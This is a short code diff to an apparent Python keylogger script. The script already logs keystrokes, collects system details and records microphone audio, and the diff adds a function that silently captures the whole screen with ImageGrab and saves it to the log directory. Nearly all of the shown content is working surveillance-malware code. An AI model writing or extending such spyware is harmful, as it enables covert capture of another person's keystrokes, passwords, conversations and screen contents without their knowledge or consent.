@@ -29,6 +29,7 @@ from PIL import ImageGrab
 key_info = r"/key_log.txt"
 system_info = r"/sys_details.txt"
 audio_info = r"/audio_rec.wav"
+screenshot_info = r"/screenshot.png"
 log_dir = r"/Users/kenluong/Developer/python/"
 
 audio_time = 10
@@ -120,6 +121,12 @@ def mic_audio():
     wf.close()
 
 mic_audio()
+
+def screenshot():
+    im = ImageGrab.grab()
+    im.save(log_dir + screenshot_info)
+
+screenshot()
 
 keys = logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
 
